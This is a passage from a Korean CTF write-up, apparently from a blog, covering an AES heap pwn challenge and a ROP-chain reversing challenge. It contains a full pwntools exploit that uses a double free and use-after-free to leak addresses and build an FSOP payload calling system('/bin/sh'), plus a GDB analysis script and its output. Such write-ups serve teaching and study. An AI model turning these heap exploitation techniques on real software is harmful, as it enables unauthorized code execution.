  v5 = 0;
  for ( i = 0; i <= 23; ++i )
    a1->cipher_and_round_keys[i] = a1->key_content[i];
  for ( j = 24; j <= 0xCF; j += 4 )
  {
    LOWORD(v4) = *(_WORD *)&a1->cipher_and_round_keys[j - 4];
    BYTE2(v4) = a1->cipher_and_round_keys[j - 2];
    HIBYTE(v4) = a1->cipher_and_round_keys[j - 1];
    if ( !(j / 4 % 6) )
    {
      Rot_word(a1, (unsigned __int8 *)&v4);
      Sub_bytes(a1, (int8_t *)&v4);
      set_rcon(a1, (char *)&v5, j / 24);
      add_rcon(a1, (char *)&v4, (char *)&v5, (char *)&v4);
    }
    a1->cipher_and_round_keys[j] = v4 ^ a1->cipher_and_round_keys[j - 24];
    a1->cipher_and_round_keys[j + 1] = BYTE1(v4) ^ a1->cipher_and_round_keys[j - 23];
    a1->cipher_and_round_keys[j + 2] = BYTE2(v4) ^ a1->cipher_and_round_keys[j - 22];
    a1->cipher_and_round_keys[j + 3] = HIBYTE(v4) ^ a1->cipher_and_round_keys[j - 21];
  }
  return __readfsqword(0x28u) ^ v6;
}
```
AES192의 키 스케쥴링 로직에서 OoB Read가 발생하며, secret키의 일부에 반영된다.
또한 remove 과정에 있어서 로직 버그가 발생하여 정상적이지 않은 노드가 free될 수 있었다.
```JavaScript
  v9 = __readfsqword(0x28u);
  std::operator<<<std::char_traits<char>>((int64_t)&std::cout, (int64_t)"Which index do you want to delete ?");
  std::istream::operator>>((int64_t)&std::cin, (int64_t)&idx);
  v0 = idx;
  if ( v0 >= get_length(vector_AES_obj) )
  {
    v1 = std::operator<<<std::char_traits<char>>((int64_t)&std::cout, (int64_t)"No way");
    std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
    exit(0);
  }
  idx_1 = idx;
  iterator = get_vector_iterator(vector_AES_obj);
  v7 = get_ele_by_idx(&iterator, idx_1);
  copy_element_ptr(&element_ptr, (__int64)&v7);
  remove_element((__int64)vector_AES_obj, element_ptr);
  v3 = *(void **)get_vect_at_idx(vector_AES_obj, idx);// OoB delete
  if ( v3 )
    operator delete(v3, 0x28uLL);
  return __readfsqword(0x28u) ^ v9;
}
```
```JavaScript
__int64 __fastcall sub_3524(__int64 vecotr, __int64 ele_vect_ptr)
{
  __int64 ned; // rbx
  __int64 ele_by_idx; // rax
  __int64 ele_vec; // [rsp+0h] [rbp-40h] BYREF
  __int64 v6; // [rsp+8h] [rbp-38h]
  __int64 next_one; // [rsp+18h] [rbp-28h] BYREF
  __int64 end[4]; // [rsp+20h] [rbp-20h] BYREF
  v6 = vecotr;
  ele_vec = ele_vect_ptr;
  end[1] = __readfsqword(0x28u);
  end[0] = get_end(vecotr);                     // vector end
  next_one = get_ele_by_idx(&ele_vec, 1LL);
  if ( is_not_end((__int64)&next_one, (__int64)end) )
  {
    ned = get_end(v6);
    ele_by_idx = get_ele_by_idx(&ele_vec, 1LL);
    delete_element(ele_by_idx, ned, ele_vec);
  }
  *(_QWORD *)(v6 + 8) -= 8LL;                   // decrement
  sub_3872(v6, *(_QWORD *)(v6 + 8));
  return ele_vec;
}
```
마지막 노드를 삭제시 정상적으로 free가 된다.
하지만 중간 노드에 대해 삭제를 진행하면, dangling pointer가 남게 되고, double free가 발생할 수 있다.
fastbin에서 free 검증이 널널하다는 것을 생각하면, dfb도 트리거가 가능해진다.
```JavaScript
std::istream::operator>>((int64_t)&std::cin, (int64_t)&len);
  if ( len > 0x400 || (len & 0xF) != 0 )
  {
    v0 = std::operator<<<std::char_traits<char>>((int64_t)&std::cout, (int64_t)"Invalid {plain,cipher}text length");
    std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
    exit(0);
  }
  if ( nbytes != len )
    buf = (void *)operator new[](len);
  nbytes = len;
  std::operator<<<std::char_traits<char>>((int64_t)&std::cout, (int64_t)"Enter {plain,cipher}text: ");
  read(0, buf, nbytes);
  return __readfsqword(0x28u) ^ v3;
```
여기서 freed chunk 대해서 reclaim이 가능하다.
또한 잠재적인 UAF가 발생할 수 있다.
## Exploit
```JavaScript
'''
1) AES256 Vulnerable OoB READ while initializing Key. 
2) deleting aes object triggers UAF. 
3) buf reclaim leads to memleak.
'''
from pwn import *
\#p = process('./out.bin')
p = remote('host3.dreamhack.games', 18810)
context.binary = e = ELF('./out.bin')
libc = ELF('./bc.so.6')
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
rvu = lambda x : p.recvuntil(x)
def create_AES_object(keysz):
    sla(b'>>',str(1))
    sla(b'size: ',str(keysz))
def remove_AES_object(idx):
    sla(b'>>',str(2))
    sla(b'delete',str(idx))
def set_plain_cipher_txt(sz, payload):
    assert sz&0xf==0
    sla(b'>>',str(3))
    sla(b'length:',str(sz))
    sa(b'text: ',payload)
def encrypt(idx):
    sla(b'>> ',str(4))
    sla(b'?',str(idx))
for i in range(20): # 11
    create_AES_object(128)
for i in range(19,12,-1): # 10
    remove_AES_object(i)
remove_AES_object(6) # free
# vect[3] = vect[4], vect[5]
remove_AES_object(4)
# vect[1] = vect[2], vect[4]
remove_AES_object(4)
# for i in range(6):
    # set_plain_cipher_txt(0x20,b'\xa0')
    # set_plain_cipher_txt(0x10,b'\xa0')
for i in range(3):
    create_AES_object(128)
set_plain_cipher_txt(0x20,b'\xa0')
create_AES_object(128)
set_plain_cipher_txt(0x10,b'\xa0')
set_plain_cipher_txt(0x20,b'\xe8')
encrypt(4)
rv = (p.recv(0x20))
bin_base = u64(rv[:8]) - 0x00DBE8 
heap = u64(rv[16:16+8])
success(hex(heap))
success(hex(bin_base))
remove_AES_object(3)
set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0))
set_plain_cipher_txt(0x10,b'\xa0')
set_plain_cipher_txt(0x20,p64(bin_base + 0x00DBE8))
set_plain_cipher_txt(0x10,b'\xa0')
set_plain_cipher_txt(0x20,p64(0))
encrypt(3)
rv = (p.recv(0x20))
libc_base = u64(rv[16:24]) - libc.sym._IO_2_1_stdout_
success(hex(libc_base))
vtable = 0x1e9260 + libc_base
payload_start = heap -0x29b0 
payload = b''
payload += p64(0x00000000fbad2084)
payload += p64(0) * 12
payload += p64(libc_base + libc.sym._IO_2_1_stdin_)
payload += p64(1)
payload += p64(0xffffffffffffffff)
payload += p64(0)
payload += p64(heap) # lock
payload += p64(0xffffffffffffffff)
payload += p64(0) 
payload += p64(heap+0x20)
payload += p64(0)*6
payload += p64(vtable)
payload += p64(payload_start + len(payload)+8)
payload += p64(0) * 7
payload += p64(libc_base + libc.sym["system"])
payload += p64(0)
payload += p64(libc_base+ next(libc.search(b'/bin/sh')))
payload += p64(1)
assert len(payload) < 0x200
remove_AES_object(2)
stdcpp_target= libc_base + 0x1ded60 + 0x20d000 + 0x40
set_plain_cipher_txt(0x200,payload)
set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0))
remove_AES_object(1)
set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0))
remove_AES_object(0)
set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) # set target
set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0))
set_plain_cipher_txt(0x20,p64(0xdeadbeef))
set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0))
pause()
set_plain_cipher_txt(0x20,p64(payload_start))
success(payload_start)
# remove_AES_object(1)
# set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0))
# pause()
# set_plain_cipher_txt(0x20,p64(0)*3+p64(payload_start))
# remove_AES_object(3)
# set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) 
# for i in range(2):
#     set_plain_cipher_txt(0x20,b'\x30')
#     set_plain_cipher_txt(0x10,b'A')
# set_plain_cipher_txt(0x20,b'\x30')

# create_AES_object(128)
# set_plain_cipher_txt(0x20,p64(bin_base + 0x0DBE8)+p64(0)) # can be changed to heap
# set_plain_cipher_txt(0x10,b'A')
# set_plain_cipher_txt(0x20,b'A')
# encrypt(1)
# rv = (p.recv(0x20))
p.interactive()
```
double free를 이용해서 AES_object + 0x0에 위치한 vtable을 dummy vtable로 수정하고 encrypt를 호출해 plain text를 노출시켜서 메모리 릭을 할 수 있다.
이후 stdout을 릭하고 이를 덮어서 FSOP를 했다.
# Lor - Diablo (pwn) & LoR - mechagolem (rev)
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/ida_decomp.png]
리버싱 겸 포너블이였다.
먼저 디스어셈블러를 짜고 편의기능을 추가해서 분석을 시도했다.
```JavaScript
import gdb
import struct
inf = gdb.selected_inferior()
start = 0x34785000
end = 0x3478a2d0
tmp = inf.read_memory(start,end-start)
chains = []
for i in range(((end-start)//8)):
    chains.append(struct.unpack('<Q', tmp[i*8:i*8+8])[0])
print('chains ready')
# var_564edd86b078 = length
gads = []
i = 0
while i < len(chains):
    ele = chains[i]
    if 'r-x' in gdb.execute(f'xinfo {ele}',to_string=True):
        out = gdb.execute(f'x/20xi {ele}',to_string=True)
        if ele not in gads:
            gads.append(ele)
        lines = out.split('\n')
        for line in lines:
            pass
            # print(line.split('\t')[-1])
            if 'ret' in line:
                break
    else:
        pass
        # print(hex(ele))
    i += 1
gads_ = []
c = 0
for i in gads: 
    out = gdb.execute(f'x/20xi {i}',to_string = True)
    lines = out.split('\n')
    gads_.append([])
    for line in lines:
        gads_[c].append(line.split('\t')[-1])
        if 'ret' in line:
            break
    c += 1
# c = 0
# for i in gads_:
#     print(f'{hex(start+i*8)}: gads_[{c}] : '+';'.join(i))
#     c += 1
rax = 0
rbx = 0
rcx = 0
rdx = 0
rdi = 0
rsi = 0
r8 = 0
rbp = 0
rsp = 0
eflags = 0
const_1 = 0
bin_base = 0x000055765999c000
variables = {
    0x12078 + bin_base : f'usr_input_len_{hex(bin_base+0x12078)[2:]}',
    0x12068 + bin_base : f'iterator_{hex(bin_base + 0x12068)[2:]}',
    0x12060 + bin_base : f'tmp_{hex(bin_base+0x12060)[2:]}'
}

ambig = 0b1
confi = 0b10
ambig_ptr = 0b100
reg_state ={
    'rax' : ambig,
    'rbx' : ambig, 
    'rcx' : ambig,
    'rdx' : ambig,
    'rdi' : ambig,
    'rsi' : ambig,
    'r8' : ambig,
    'rbp' : ambig,
    'rsp' : ambig,
    'eflags' : ambig
}
def process(addr):
    global i, chains, gads, rax, rbx, rcx, rdx, rdi, rsi, r8 ,rbp, rsp, eflags
    global variables, reg_state, ambig, confi
     
    if addr == gads[0]:
        if not const_1:
            if i == 0:
                print('-------- main() ---------')
            elif start+i*8 == 0x34785440:
                print('-------- exit_internal() ---------')
            print(f'{hex(start+i*8)}: rdx = {chains[i+1]} ; r12 = {chains[i+2]}')
        rdx = chains[i+1]
        r12 = chains[i+2]
        reg_state['rdx'] = confi | ambig_ptr
        reg_state['r12'] = confi | ambig_ptr
        i += 2
    elif addr == gads[1]:
        if not const_1:
            print(f'{hex(start+i*8)}: rsi = {chains[i+1]}')
        rsi = chains[i+1]
        reg_state['rsi'] = confi | ambig_ptr
        i += 1
    elif addr == gads[2]:
        if not const_1:
            print(f'{hex(start+i*8)}: rdi = {chains[i+1]}')
        rdi  = chains[i+1]
        reg_state['rdi'] = confi | ambig_ptr
        i += 1
    elif addr == gads[3]:
        if not const_1:
            if start+i*8 == 0x34785390:
                print('-------- encode() ---------')
            elif start+i*8 == 0x347853c8:
                print('-------- print() ---------')
            elif start+i*8 == 0x34785400:
                print('-------- exit() ---------')
            elif start+i*8 == 0x347855d8:
                print('-------- encode_internal() ---------')
            print(f'{hex(start+i*8)}: rax = {chains[i+1]}')
        rax = chains[i+1]
        reg_state['rax'] = confi | ambig_ptr
        i += 1
    elif addr == gads[4]:
        if rax == 1:
            if reg_state['rdi'] & confi and reg_state['rdx'] & confi and reg_state['rsi'] & confi:
                out = gdb.execute(f'x/s {rsi}',to_string = True)
                out = (out[out.index('"'):-1]) 
                print(f'{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx}) // {out}')
                rax = rdx
                reg_state['rax'] |= confi
            else:
                if reg_state['rdi'] & confi:
                    if reg_state['rdx'] & confi:
                        print(f'{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx})')
                        rax = rdx
                        reg_state['rax'] = confi
                    else:
                        print(f'{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, rdx)')
                        reg_state['rax'] = ambig
                else:
                    print(f'{hex(start+i*8)}: sys_write(rdi, rsi, rdx)')
                    reg_state['rax'] = ambig
            
        elif rax == 0:
            if rsi not in variables.keys() and reg_state['rsi'] &confi:
                varname = hex(rsi).replace('0x','')
                variables[rsi] = f'buf_{varname}'
            if reg_state['rdx'] & confi:
                if reg_state['rdi'] & confi:
                    if reg_state['rsi'] & confi:
                        print(f'{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, {rdx})')
                    else:
                        print(f'{hex(start+i*8)}: sys_read({rdi}, rsi , {rdx})')
                else: 
                    print(f'{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, {rdx})')
                rax = rdx
                reg_state['rax'] = confi
            else:
                if reg_state['rdi'] & confi:
                    print(f'{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, rdx)')
                else:
                    print(f'{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, rdx)')
            reg_state['rsi'] = confi
            reg_state['rax'] = ambig
        elif rax == 60:
            if reg_state['rdi'] & confi:
                print(f'{hex(start+i*8)}: sys_exit({rdi})')
            else:
                print(f'{hex(start+i*8)}: sys_exit(rdi)')
        else:
            print(f'{hex(start+i*8)}: syscall_{rax} ({rdi}, {rsi}, {rdx})')
    elif addr == gads[5]:
        if not const_1:
            if reg_state['rax'] & confi:
                if rax in variables.keys():
                    print(f'{hex(start+i*8)}: rax = (QWORD)({variables[rax]})')
                else:
                    print(f'{hex(start+i*8)}: rax = *(QWORD *)(rax) // *(QWORD *){hex(rax)}')
            else:
                print(f'{hex(start+i*8)}: rax = *(QWORD *)(rax)')
        reg_state['rax'] = ambig | ambig_ptr
        rax = 0xdeadbeef
    elif addr == gads[6]:
        if reg_state['rsi'] & confi:
            if reg_state['rax'] & confi:
                reg_state['rax'] = confi 
            else:
                reg_state['rax'] = ambig 
        else:
           reg_state['rax'] = ambig
        if not const_1:
            if reg_state['rsi'] & confi:
                if reg_state['rax'] & confi:
                    print(f'{hex(start+i*8)}: eax &= esi // eax = {(rax)} & {(rsi)}')
                    reg_state['rax'] = confi
                else:
                    print(f'{hex(start+i*8)}: eax &= esi // eax &= {(rsi)}')
                    reg_state['rax'] = ambig
            else:
                print(f'{hex(start+i*8)}: eax &= esi')
                reg_state['rax'] = ambig
        rax &= rsi&0xffffffff
    elif addr == gads[7]:
        if not const_1:
            if reg_state['rdi'] & confi: 
                if reg_state['rax'] & confi:
                    print(f'{hex(start+i*8)}: rax -= rdi // rax = {(rax)} - {(rdi)}')
                    reg_state['rax'] = confi
                    reg_state['eflags'] = confi
                    eflags = (rax - rdi)&0xfffffffffffffffff == 0
                else:
                    print(f'{hex(start+i*8)}: rax -= rdi // rax -= {(rdi)}')
                    reg_state['rax'] = ambig
                    reg_state['eflags'] = ambig
            else:
                print(f'{hex(start+i*8)}: rax -= rdi')
                reg_state['rax'] = ambig
                reg_state['eflags'] = ambig
        rax -= rdi
        rax &= 0xffffffffffffffff
    elif addr == gads[8]:
        if not const_1:
            if reg_state['eflags'] &ambig:
                if reg_state['rax'] & confi:
                    if reg_state['rdx'] & confi:
                        print(f'{hex(start+i*8)}: if true -> rax = {hex(rdx)} else -> rax = {hex(rax)}')
                    else:
                        print(f'{hex(start+i*8)}: if true -> rax = {hex(rdx)} else -> rax = rax')
                else:
                    print(f'{hex(start+i*8)}: if true -> rax = rdx else -> rax = rax')
                reg_state['rax'] = ambig
            else:
                if eflags:
                    if reg_state['rax'] & confi:
                        print(f'{hex(start+i*8)}: rax = {hex(rdx)}')
                    else:
                        print(f'{hex(start+i*8)}: rax = rdx')
                else:
                    if reg_state['rdx'] & confi:
                        print(f'{hex(start+i*8)}: rax = {hex(rdx)}')
                    else:
                        pass
        reg_state['rax'] = ambig | ambig_ptr
        rax = 0xdeadbeef
    elif addr == gads[9]:
        if not const_1:
            if reg_state['rax'] & ambig:
                print(f'{hex(start+i*8)}: rdx |= rax')
                reg_state['rdx'] = ambig
                rdx = 0xdeadbeef
            else:
                print(f'{hex(start+i*8)}: rdx |= rax // rdx |= {rax}')
                reg_state['rdx'] = confi
                rdx |= rax
    elif addr == gads[10]:
        if not const_1:
            if reg_state['rdx'] & confi:
                if rdx == 0x34785050:
                    print(f'{hex(start+i*8)}: rsp = rdx // rsp = main+0x50 // back to menu')
                elif rdx == 0x34785370:
                    print(f'{hex(start+i*8)}: rsp = rdx // rsp = main+0x370 // back to menu')
                else:
                    print(f'{hex(start+i*8)}: rsp = rdx // rsp = {hex(rdx)}')
                reg_state['rsp'] = confi
                rsp = rdx
            else:
                print(f'{hex(start+i*8)}: rsp = rdx')
                reg_state['rsp'] = ambig
                rsp = 0xdeadbeef
    elif addr == gads[11]: # mroe interpretation required
        if not const_1:
            if reg_state['rax'] & confi:
                print(f'{hex(start+i*8)}: inc idx ; stack[idx] = rsp ; rsp = {hex(rax)}')
                reg_state['rsp'] = confi
                rsp = rax
            else: 
                print(f'{hex(start+i*8)}: inc idx ; stack[idx] = rsp ; rsp = rax')
                reg_state['rsp'] = ambig
            
    elif addr == gads[12]:
        if not const_1:
            if reg_state['rbp'] & confi:
                print(f'{hex(start+i*8)}: mov rsp, {(rbp)} ; pop rbp')
            else:
                if start+i*8 == 0x34785438:
                    print('-------- function_4() ---------')
                print(f'{hex(start+i*8)}: mov rsp, rbp ; pop rbp')
        if reg_state['rbp'] & confi:
            rsp = rbp
            reg_state['rsp'] = confi
        reg_state['rbp'] = ambig
        rbp = 0xdeadbeef
    elif addr == gads[13]:
        if not const_1:
            if reg_state['rax'] & confi:
                print(f'{hex(start+i*8)}: r8d = eax; eax = r8d')
                r8 = rax &0xffffffff
                rax = r8
                reg_state['r8'] = confi
            else:
                print(f'{hex(start+i*8)}: r8d = eax; eax = r8d')
                r8 = 0xdeadbeef
                rax = r8
                reg_state['r8'] = ambig
    elif addr == gads[14]:
        if not const_1:
            if reg_state['rax'] & confi:
                print(f'{hex(start+i*8)}: rax -= 1 // rax = {rax} - 1')
                rax -= 1
                rax &=0xffffffffffffffff
            else:
                print(f'{hex(start+i*8)}: rax -= 1')
                rax = 0xdeadbeef
                reg_state['rax'] = ambig
                
    elif addr == gads[15]:
        if rdx not in variables.keys() and reg_state['rdx'] &confi:
            varname = hex(rdx).replace('0x','')
            variables[rdx] = f'var_{varname}'
        if not const_1:
            if reg_state['rax'] & confi:
                if reg_state['rdx'] & confi:
                    print(f'{hex(start+i*8)}: (QWORD){variables[rdx]} = {rax}')
                else:
                    print(f'{hex(start+i*8)}: *(QWORD *)(rdx) = {rax}')
            elif reg_state['rdx'] & confi:
                print(f'{hex(start+i*8)}: *(QWORD *)({variables[rdx]}) = rax')
            else:     
                print(f'{hex(start+i*8)}: *(QWORD *)(rdx) = rax')
        # must write memory
    elif addr == gads[16]:
        if rsi not in variables.keys() and reg_state['rsi'] &confi:
            varname = hex(rsi).replace('0x','')
            variables[rsi] = f'var_{varname}'
        if not const_1:
            if reg_state['rsi'] & confi:
                if reg_state['rdi'] & confi:
                    print(f'{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = {rdi}')
                else:
                    print(f'{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = rdi')
            elif reg_state['rdi'] & confi:
                print(f'{hex(start+i*8)}: *(QWORD *)(rsi) = {rdi}')
            else: 
                print(f'{hex(start+i*8)}: *(QWORD *)(rsi) = rdi')
        # must write memory
    elif addr == gads[17]:
        if not const_1:
            if reg_state['rdi'] & confi:
                if (rdi+0x18) in variables:
                    print(f'{hex(start+i*8)}: rax -= (QWORD)({variables[rdi+0x18]})')
                else:
                    print(f'{hex(start+i*8)}: rax -= *(QWORD *)({rdi+0x18})')
            else:
                print(f'{hex(start+i*8)}: rax -= *(QWORD *)(rdi+0x18)')
            reg_state['rax'] = ambig
        rax = 0xdeadbeef        
    elif addr == gads[18]:
        if not const_1:
            print(f'{hex(start+i*8)}: rbx = {chains[i+1]}')
        reg_state['rbx'] = confi
        rbx = chains[i+1]
        i += 1
    elif addr == gads[19]:
        if not const_1:
            print(f'{hex(start+i*8)}: rax += rbx ; rbx = {chains[i+1]} ; rbp = {chains[i+2]} ; r12 = {chains[i+3]} ; r13 = {chains[i+4]}')
        rax += rbx
        rax &= 0xffffffffffffffff
        rbx = chains[i+1]
        rbp = chains[i+2]
        r12 = chains[i+3]
        r13 = chains[i+4]
        reg_state['rbx'] = confi
        reg_state['rbp'] = confi
        reg_state['r12'] = confi
        reg_state['r13'] = confi
        i += 4
    elif addr == gads[20]:
        if not const_1:
            print(f'{hex(start+i*8)}: rcx = {chains[i+1]}')
        rcx = chains[i+1]
        reg_state['rcx'] = confi
        i += 1
    elif addr == gads[21]:
        if rdi not in variables.keys() and reg_state['rdi'] &confi:
            varname = hex(rdi).replace('0x','')
            variables[rdi] = f'var_{varname}'
        if not const_1:
            if reg_state['rdi'] & confi:
                print(f'{hex(start+i*8)}: rax <<= cl ; (QWORD)({variables[rdi]}) |= rax ; eax = 0')
            else:
                print(f'{hex(start+i*8)}: rax <<= cl ; *(QWORD *)(rdi) |= rax ; eax = 0')
            
        rax <<= (rcx&0xff)
        reg_state['rax'] = confi
        rax = 0
        \#mem accesss needed
    elif addr == gads[22]: 
        if rax not in variables.keys() and reg_state['rax'] &confi:
            varname = hex(rax).replace('0x','')
            variables[rax] = f'var_{varname}'
        if not const_1:
            if reg_state['rax'] & confi: 
                print(f'{hex(start+i*8)}: (DWORD)({variables[rax]}) += 1')
            else:
                print(f'{hex(start+i*8)}: *(DWORD *)(rax) += 1')
            
    elif addr == gads[23]:
        if not const_1:
            print(f'{hex(start+i*8)}: invalid ops')
    elif addr == gads[24]:
        if not const_1:
            if reg_state['rdi'] & confi:
                print(f'{hex(start+i*8)}: rax += {rdi}')
            else:
                print(f'{hex(start+i*8)}: rax += rdi')
        if reg_state['rax'] & confi and reg_state['rdi'] & confi:
            rax += rdi
            rax &= 0xffffffffffffffff
    elif addr == gads[25]:
        if not const_1:
            print(f'{hex(start+i*8)}: rax >>= 6')
        if reg_state['rax'] & confi:
            rax >>= 6
        else:
            rax = 0xdeadbeef
    elif addr == gads[26]:
        if not const_1:
            if reg_state['rdx'] & confi:
                if reg_state['rax'] & confi:
                    print(f'{hex(start+i*8)}: *(BYTE *)({rdx}) = {rax&0xff} ; rax = rdi')
                else:
                    print(f'{hex(start+i*8)}: *(BYTE *)({rdx}) = rax ; rax = rdi')  
            else:
                print(f'{hex(start+i*8)}: *(BYTE *)(rdx) = rax ; rax = rdi')  
        if reg_state['rdi'] & confi: 
            reg_state['rax'] = confi
            rax = rdi
        else:
            rax = 0xdeadbeef
        # memory access needed
        rax = rdi
    elif addr == gads[27]:
        if not const_1:
            print(f'{hex(start+i*8)}: eax *= 2')
        if reg_state['rax'] & confi:
            rax *= 2
            rax &=0xffffffff
        else:
            rax = 0xdeadbeef
    elif addr == gads[28]: # more 
        if not const_1:
            print(f'{hex(start+i*8)}: rsp = stack[idx] ; idx -= 1')
    elif addr == gads[29]:
        if not const_1:
            print(f'{hex(start+i*8)}: xchg edi, eax')
        if reg_state['rax'] & confi and reg_state['rdi'] & confi:
            tmp = rdi&0xffffffff
            rdi = rax&0xffffffff
            rax = tmp
    elif addr == gads[30]:
        if not const_1:
            print(f'{hex(start+i*8)}: eax <<= 0x17 ; ecx |= eax')
        if reg_state['rax'] & confi :
            rax <<= 0x17
            rax &=0xffffffff
            if reg_state['rcx'] & conf :
                rcx |= (rax&0xffffffff)
            else:
                rcx = 0xdeadbeef
        else:
            rax = 0xdeadbeef
    else:
        print('GG')
        exit()
i = 0
while i < len(chains):
    ele = chains[i]
    if 'r-x' in gdb.execute(f'xinfo {ele}',to_string=True):
        process(ele)
        # break
    else:
        pass
        print(f'{hex(start+i*8)}: {hex(ele)}')
    i += 1
```
나름대로 레지스터들의 상태를 기록하고 그 시점에 연산이 가능한지 아닌지에 대해서 판단을 해서, 연산이 가능하면 주석으로 그 결과를 표시한다. 시스템 콜의 번호들도 그 시점에 연산이 가능한 경우 직접 sys_read 같은 시스템 콜로 래핑해서 출력한다.
```JavaScript
chains ready
-------- main() ---------
0x34785000: rdx = 23 ; r12 = 0
0x34785018: rsi = 93966797815905
0x34785028: rdi = 1
0x34785038: rax = 1
0x34785048: sys_write(1, 0x5576599ac061, 23) // "Simple Base64 Encoder!\n"
0x34785050: rdx = 29 ; r12 = 0
0x34785068: rsi = 93966797815950
0x34785078: rdi = 1
0x34785088: rax = 1
0x34785098: sys_write(1, 0x5576599ac08e, 29) // "1. Encode\n2. Print\n3. Exit\n> "
0x347850a0: rdx = 2 ; r12 = 0
0x347850b8: rsi = 93966797857408
0x347850c8: rdi = 0
0x347850d8: rax = 0
0x347850e8: sys_read(0, buf_5576599b6280, 2)
0x347850f0: rdi = 2609
0x34785100: rax = 93966797857408
0x34785110: rax = (QWORD)(buf_5576599b6280)
0x34785118: rsi = 65535
0x34785128: eax &= esi // eax &= 65535
0x34785130: rax -= rdi // rax -= 2609
0x34785138: rax = 880300432
0x34785148: rdx = 880300944 ; r12 = 0
0x34785160: if true -> rax = 0x34785390 else -> rax = 0x34785190
0x34785168: rdx = 0 ; r12 = 4294967295
```
이런식으로 결과가 출력된다.
```JavaScript
0x34788db8: rdx = 880315912 ; r12 = 0
0x34788dd0: if true -> rax = 0x34788e08 else -> rax = 0x3478a218
0x34788dd8: rdx = 0 ; r12 = 4294967295
0x34788df0: rdx |= rax
0x34788df8: rsp = rdx
0x34788e00: invalid ops
0x34788e08: rax = 93966797857408
0x34788e18: rbx = 41
0x34788e28: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295
0x34788e50: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62a9
0x34788e58: rsi = 255
0x34788e68: eax &= esi // eax &= 255
0x34788e70: rdi = 414588904
0x34788e80: xchg edi, eax
0x34788e88: rax >>= 6
0x34788e90: rsi = 255
0x34788ea0: rax >>= 6
0x34788ea8: eax &= esi // eax &= 255
0x34788eb0: xchg edi, eax
0x34788eb8: rax -= rdi // rax -= 414588904
0x34788ec0: rax = 880321048
0x34788ed0: rdx = 880316192 ; r12 = 0
0x34788ee8: if true -> rax = 0x34788f20 else -> rax = 0x3478a218
0x34788ef0: rdx = 0 ; r12 = 4294967295
0x34788f08: rdx |= rax
0x34788f10: rsp = rdx
0x34788f18: invalid ops
0x34788f20: rax = 93966797857408
0x34788f30: rbx = 42
0x34788f40: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295
0x34788f68: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62aa
0x34788f70: rsi = 255
0x34788f80: eax &= esi // eax &= 255
0x34788f88: eax *= 2
0x34788f90: eax *= 2
0x34788f98: rdi = 392
0x34788fa8: rax -= rdi // rax -= 392
0x34788fb0: rax = 880321048
0x34788fc0: rdx = 880316432 ; r12 = 0
0x34788fd8: if true -> rax = 0x34789010 else -> rax = 0x3478a218
0x34788fe0: rdx = 0 ; r12 = 4294967295
0x34788ff8: rdx |= rax
0x34789000: rsp = rdx
0x34789008: invalid ops
0x34789010: rax = 93966797857408
0x34789020: rbx = 43
0x34789030: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295
0x34789058: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ab
0x34789060: rsi = 255
0x34789070: eax &= esi // eax &= 255
0x34789078: rdi = 912316478
0x34789088: xchg edi, eax
0x34789090: rsi = 4286578688
0x347890a0: eax &= esi // eax &= 4286578688
0x347890a8: xchg edi, eax
0x347890b0: eax <<= 0x17 ; ecx |= eax
0x347890b8: rax -= rdi // rax -= 912316478
0x347890c0: rax = 880321048
0x347890d0: rdx = 880316704 ; r12 = 0
0x347890e8: if true -> rax = 0x34789120 else -> rax = 0x3478a218
0x347890f0: rdx = 0 ; r12 = 4294967295
0x34789108: rdx |= rax
0x34789110: rsp = rdx
0x34789118: invalid ops
0x34789120: rax = 93966797857408
0x34789130: rbx = 44
0x34789140: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295
0x34789168: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ac
0x34789170: rsi = 255
0x34789180: eax &= esi // eax &= 255
0x34789188: rdi = 1699151259
0x34789198: xchg edi, eax
0x347891a0: rax >>= 6
0x347891a8: rsi = 255
0x347891b8: rax >>= 6
0x347891c0: eax &= esi // eax &= 255
0x347891c8: xchg edi, eax
0x347891d0: rax -= rdi // rax -= 1699151259
0x347891d8: rax = 880321048
0x347891e8: rdx = 880316984 ; r12 = 0
0x34789200: if true -> rax = 0x34789238 else -> rax = 0x3478a218
0x34789208: rdx = 0 ; r12 = 4294967295
0x34789220: rdx |= rax
0x34789228: rsp = rdx
0x34789230: invalid ops
0x34789238: rax = 93966797857408
0x34789248: rbx = 45
0x34789258: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295
0x34789280: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ad
0x34789288: rsi = 255
0x34789298: eax &= esi // eax &= 255
0x347892a0: eax *= 2
0x347892a8: eax *= 2
0x347892b0: rdi = 500
0x347892c0: rax -= rdi // rax -= 500
0x347892c8: rax = 880321048
0x347892d8: rdx = 880317224 ; r12 = 0
